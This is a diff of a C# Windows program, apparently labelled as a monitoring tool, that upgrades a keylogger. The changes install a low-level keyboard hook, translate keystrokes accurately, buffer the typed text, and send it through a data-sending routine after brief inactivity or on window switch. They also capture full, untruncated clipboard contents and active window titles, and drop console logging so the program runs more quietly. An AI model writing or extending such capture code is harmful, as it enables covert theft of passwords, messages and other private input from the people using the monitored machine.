@@ -24,6 +24,12 @@ namespace UnidadAutomatizadaMonitoreo
         static Program instancia;
 
         // ==========================================
+        // BUFFER MEJORADO
+        // ==========================================
+        static StringBuilder bufferTeclado = new StringBuilder();
+        static DateTime ultimaTecla = DateTime.Now;
+
+        // ==========================================
         // MAIN
         // ==========================================
         [STAThread]
@@ -53,7 +59,7 @@ namespace UnidadAutomatizadaMonitoreo
         }
 
         // ==========================================
-        // 1. HOOK TECLADO
+        // HOOK TECLADO
         // ==========================================
         private static IntPtr _hookID = IntPtr.Zero;
         private static LowLevelKeyboardProc _proc = HookCallback;
@@ -62,10 +68,6 @@ namespace UnidadAutomatizadaMonitoreo
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN = 0x0100;
-
-        static StringBuilder bufferTeclado = new StringBuilder();
-        static DateTime ultimoEnvio = DateTime.Now;
-        static DateTime ultimoPegado = DateTime.MinValue;
 
         static void IniciarHookTeclado()
         {
@@ -88,70 +90,63 @@ namespace UnidadAutomatizadaMonitoreo
             {
                 int vkCode = Marshal.ReadInt32(lParam);
 
-                bool ctrl = (GetKeyState(0x11) & 0x8000) != 0;
+                ultimaTecla = DateTime.Now;
 
-                // Detectar Ctrl + V de forma segura
-                if (ctrl && vkCode == 0x56)
+                // BACKSPACE real
+                if (vkCode == 8)
                 {
-                    if ((DateTime.Now - ultimoPegado).TotalMilliseconds > 300)
-                    {
-                        ultimoPegado = DateTime.Now;
+                    if (bufferTeclado.Length > 0)
+                        bufferTeclado.Remove(bufferTeclado.Length - 1, 1);
 
-                        try
-                        {
-                            instancia?.BeginInvoke(new Action(() =>
-                            {
-                                DetectarPegado();
-                            }));
-                        }
-                        catch { }
-                    }
+                    return CallNextHookEx(_hookID, nCode, wParam, lParam);
                 }
 
-                bufferTeclado.Append(TraducirTecla(vkCode));
+                string tecla = TraducirTeclaReal(vkCode);
+                bufferTeclado.Append(tecla);
             }
 
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
         }
 
-        static void DetectarPegado()
+        // ==========================================
+        // TRADUCCIÓN REAL (🔥 CLAVE)
+        // ==========================================
+        static string TraducirTeclaReal(int vkCode)
         {
-            try
-            {
-                if (Clipboard.ContainsText())
-                {
-                    string texto = Clipboard.GetText();
+            byte[] keyboardState = new byte[256];
+            GetKeyboardState(keyboardState);
 
-                    if (!string.IsNullOrEmpty(texto))
-                    {
-                        string recortado = texto.Length > 1000
-                            ? texto.Substring(0, 1000) + "..."
-                            : texto;
+            uint scanCode = 0;
+            StringBuilder sb = new StringBuilder(5);
 
-                        _ = EnviarDatos("paste", ultimaVentana,
-                            new { texto_pegado = "[PEGADO] " + recortado });
-                    }
-                }
-            }
-            catch (Exception ex)
-            {
-                Console.WriteLine("Error paste: " + ex.Message);
-            }
+            int result = ToUnicode((uint)vkCode, scanCode, keyboardState, sb, sb.Capacity, 0);
+
+            if (result > 0)
+                return sb.ToString();
+
+            // especiales
+            if (vkCode == 13) return " [ENTER] ";
+            if (vkCode == 9) return " [TAB] ";
+            if (vkCode == 27) return " [ESC] ";
+
+            return "";
         }
 
+        // ==========================================
+        // ENVÍO INTELIGENTE (POR INACTIVIDAD)
+        // ==========================================
         static void IniciarEnvioTeclado()
         {
             Task.Run(async () =>
             {
                 while (true)
                 {
-                    if ((DateTime.Now - ultimoEnvio).TotalSeconds >= 5 && bufferTeclado.Length > 0)
+                    if ((DateTime.Now - ultimaTecla).TotalMilliseconds >= 1000 && bufferTeclado.Length > 0)
                     {
                         await EnviarDatos("keystroke", ultimaVentana,
                             new { texto_capturado = bufferTeclado.ToString() });
 
                         bufferTeclado.Clear();
-                        ultimoEnvio = DateTime.Now;
                     }
 
                     await Task.Delay(200);
@@ -160,9 +155,8 @@ namespace UnidadAutomatizadaMonitoreo
         }
 
         // ==========================================
-        // 2. VENTANA ACTIVA (FIX EXPLORER)
+        // MONITOR DE VENTANAS
         // ==========================================
-
         static void IniciarMonitorVentanas()
         {
             Task.Run(async () =>
@@ -170,14 +164,12 @@ namespace UnidadAutomatizadaMonitoreo
                 while (true)
                 {
                     IntPtr handle = GetForegroundWindow();
-
                     GetWindowThreadProcessId(handle, out uint pid);
 
                     try
                     {
                         var proceso = Process.GetProcessById((int)pid);
                         string nombreProceso = proceso.ProcessName;
-
                         string titulo = ObtenerTituloVentana(handle);
 
                         string ventanaActual = string.IsNullOrEmpty(titulo)
@@ -188,10 +180,17 @@ namespace UnidadAutomatizadaMonitoreo
                         {
                             ultimaVentana = ventanaActual;
 
-                            Console.WriteLine($"[{DateTime.Now:HH:mm:ss}] {ventanaActual}");
-
                             await EnviarDatos("window_focus", ventanaActual,
                                 new { proceso = nombreProceso });
+
+                            // 🔥 ENVÍA LO QUE QUEDÓ ANTES DE CAMBIAR
+                            if (bufferTeclado.Length > 0)
+                            {
+                                await EnviarDatos("keystroke", ultimaVentana,
+                                    new { texto_capturado = bufferTeclado.ToString() });
+
+                                bufferTeclado.Clear();
+                            }
                         }
                     }
                     catch { }
@@ -201,7 +200,6 @@ namespace UnidadAutomatizadaMonitoreo
             });
         }
 
-        // 🔥 NUEVO MÉTODO PARA TITULO REAL
         static string ObtenerTituloVentana(IntPtr handle)
         {
             StringBuilder sb = new StringBuilder(512);
@@ -210,7 +208,7 @@ namespace UnidadAutomatizadaMonitoreo
         }
 
         // ==========================================
-        // 3. CLIPBOARD EVENT
+        // CLIPBOARD
         // ==========================================
         private const int WM_CLIPBOARDUPDATE = 0x031D;
 
@@ -231,19 +229,12 @@ namespace UnidadAutomatizadaMonitoreo
 
                         if (!string.IsNullOrEmpty(texto))
                         {
-                            string recortado = texto.Length > 1000
-                                ? texto.Substring(0, 1000) + "..."
-                                : texto;
-
                             _ = EnviarDatos("clipboard", ultimaVentana,
-                                new { texto_capturado = "[COPIADO] " + recortado });
+                                new { texto_capturado = "[COPIADO] " + texto });
                         }
                     }
                 }
-                catch (Exception ex)
-                {
-                    Console.WriteLine("Clipboard error: " + ex.Message);
-                }
+                catch { }
             }
 
             base.WndProc(ref m);
@@ -285,34 +276,13 @@ namespace UnidadAutomatizadaMonitoreo
         [DllImport("user32.dll")] static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
         [DllImport("user32.dll")] static extern bool AddClipboardFormatListener(IntPtr hwnd);
 
-        [DllImport("user32.dll")] static extern short GetKeyState(int nVirtKey);
+        [DllImport("user32.dll")] static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
-        [DllImport("user32.dll", CharSet = CharSet.Auto)]
-        static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
+        [DllImport("user32.dll")]
+        static extern int ToUnicode(uint wVirtKey, uint wScanCode,
+            byte[] lpKeyState, StringBuilder pwszBuff, int cchBuff, uint wFlags);
 
-        // ==========================================
-        // UTILIDADES
-        // ==========================================
-        static string TraducirTecla(int vkCode)
-        {
-            bool shift = (GetKeyState(0x10) & 0x8000) != 0;
-            bool caps = Console.CapsLock;
-
-            if (vkCode >= 65 && vkCode <= 90)
-            {
-                bool upper = shift ^ caps;
-                char c = (char)vkCode;
-                return upper ? c.ToString() : c.ToString().ToLower();
-            }
-
-            if (vkCode >= 48 && vkCode <= 57)
-                return ((char)vkCode).ToString();
-
-            if (vkCode == 32) return " ";
-            if (vkCode == 13) return " [ENTER] ";
-            if (vkCode == 8) return "[BACKSPACE]";
-
-            return "";
-        }
+        [DllImport("user32.dll")]
+        static extern bool GetKeyboardState(byte[] lpKeyState);
     }
 }
